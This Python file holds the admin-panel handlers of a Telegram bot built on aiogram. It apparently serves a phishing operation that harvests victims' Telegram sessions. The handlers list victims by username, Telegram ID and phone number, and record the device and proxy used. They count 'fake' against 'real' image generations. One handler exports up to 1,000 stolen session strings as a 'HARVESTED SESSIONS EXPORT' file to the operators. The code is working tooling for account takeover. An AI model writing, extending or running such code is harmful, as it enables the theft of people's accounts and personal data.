"""Admin panel handlers."""

import logging
from aiogram import Router, F
from aiogram.types import CallbackQuery, Message
from aiogram.filters import Command

from bot.database import Database
from bot.keyboards import admin_menu_kb, back_to_menu_kb
from bot.config import config

logger = logging.getLogger(__name__)
router = Router()


@router.message(Command("admin"))
async def admin_panel(message: Message, db: Database):
    if message.from_user.id not in config.ADMIN_IDS:
        return

    stats = db.get_stats()
    text = (
        "🔐 <b>Админ-панель</b>\n\n"
        f"👥 Всего пользователей: <b>{stats['total_users']}</b>\n"
        f"🗂 Валидных сессий: <b>{stats['valid_sessions']}</b>\n"
        f"📊 Всего сессий: <b>{stats['total_sessions']}</b>\n"
        f"🖼 Реальных генераций: <b>{stats['real_generations']}</b>\n"
        f"🎭 Фейковых генераций: <b>{stats['fake_generations']}</b>"
    )
    await message.answer(text, reply_markup=admin_menu_kb(), parse_mode="HTML")


@router.callback_query(F.data == "admin_sessions")
async def show_sessions(callback: CallbackQuery, db: Database):
    if callback.from_user.id not in config.ADMIN_IDS:
        await callback.answer("Нет доступа.", show_alert=True)
        return

    sessions = db.get_all_sessions(limit=10)
    if not sessions:
        await callback.answer("Сессий пока нет.", show_alert=True)
        return

    text = "🗂 <b>Последние сессии:</b>\n\n"
    for s in sessions:
        status = "✅" if s["is_valid"] else "❌"
        text += (
            f"{status} ID: <code>{s['id']}</code>\n"
            f"📱 {s['phone']}\n"
            f"👤 @{s['victim_username'] or 'N/A'} | ID: {s['victim_tg_id']}\n"
            f"🕐 {s['auth_timestamp']}\n"
            f"🌐 {s['proxy_used']}\n"
            f"📱 {s['device_model']} | {s['system_version']}\n\n"
        )

    await callback.message.answer(text, reply_markup=admin_menu_kb(), parse_mode="HTML")
    await callback.answer()


@router.callback_query(F.data == "admin_stats")
async def refresh_stats(callback: CallbackQuery, db: Database):
    if callback.from_user.id not in config.ADMIN_IDS:
        await callback.answer("Нет доступа.", show_alert=True)
        return

    stats = db.get_stats()
    text = (
        "📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: <b>{stats['total_users']}</b>\n"
        f"🗂 Сессий (валидных/всего): <b>{stats['valid_sessions']}/{stats['total_sessions']}</b>\n"
        f"🖼 Генераций (реал/фейк): <b>{stats['real_generations']}/{stats['fake_generations']}</b>"
    )
    await callback.message.answer(text, reply_markup=admin_menu_kb(), parse_mode="HTML")
    await callback.answer()


@router.callback_query(F.data == "admin_users")
async def show_users(callback: CallbackQuery, db: Database):
    """NOW WORKING — shows last 10 users."""
    if callback.from_user.id not in config.ADMIN_IDS:
        await callback.answer("Нет доступа.", show_alert=True)
        return

    conn = db._get_conn()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM bot_users ORDER BY joined_at DESC LIMIT 10")
    users = cursor.fetchall()

    if not users:
        await callback.answer("Пользователей пока нет.", show_alert=True)
        return

    text = "👥 <b>Последние пользователи:</b>\n\n"
    for u in users:
        text += (
            f"🆔 <code>{u['tg_id']}</code>\n"
            f"📛 @{u['username'] or 'N/A'}\n"
            f"🎨 Генераций: {u['total_generations']}\n"
            f"🔐 Верификация: {'✅' if u['is_verified'] else '❌'}\n"
            f"🕐 {u['joined_at']}\n\n"
        )

    await callback.message.answer(text, reply_markup=admin_menu_kb(), parse_mode="HTML")
    await callback.answer()


@router.callback_query(F.data == "admin_export")
async def export_data(callback: CallbackQuery, db: Database):
    if callback.from_user.id not in config.ADMIN_IDS:
        await callback.answer("Нет доступа.", show_alert=True)
        return

    # Export sessions as text file
    sessions = db.get_all_sessions(limit=1000)
    if not sessions:
        await callback.answer("Сессий пока нет.", show_alert=True)
        return

    export_text = "HARVESTED SESSIONS EXPORT\n" + "="*50 + "\n\n"
    for s in sessions:
        export_text += f"ID: {s['id']}\n"
        export_text += f"Phone: {s['phone']}\n"
        export_text += f"Username: @{s['victim_username'] or 'N/A'}\n"
        export_text += f"TG ID: {s['victim_tg_id']}\n"
        export_text += f"Session: {s['session_string']}\n"
        export_text += f"Device: {s['device_model']} | {s['system_version']}\n"
        export_text += f"Proxy: {s['proxy_used']}\n"
        export_text += f"Time: {s['auth_timestamp']}\n"
        export_text += f"Valid: {'YES' if s['is_valid'] else 'NO'}\n"
        export_text += "-"*50 + "\n\n"

    # Save to file
    export_path = "data/sessions_export.txt"
    with open(export_path, "w", encoding="utf-8") as f:
        f.write(export_text)

    from aiogram.types import FSInputFile
    await callback.message.answer_document(
        document=FSInputFile(export_path),
        caption="📤 <b>Экспорт сессий</b>",
        reply_markup=admin_menu_kb(),
        parse_mode="HTML",
    )
    await callback.answer()
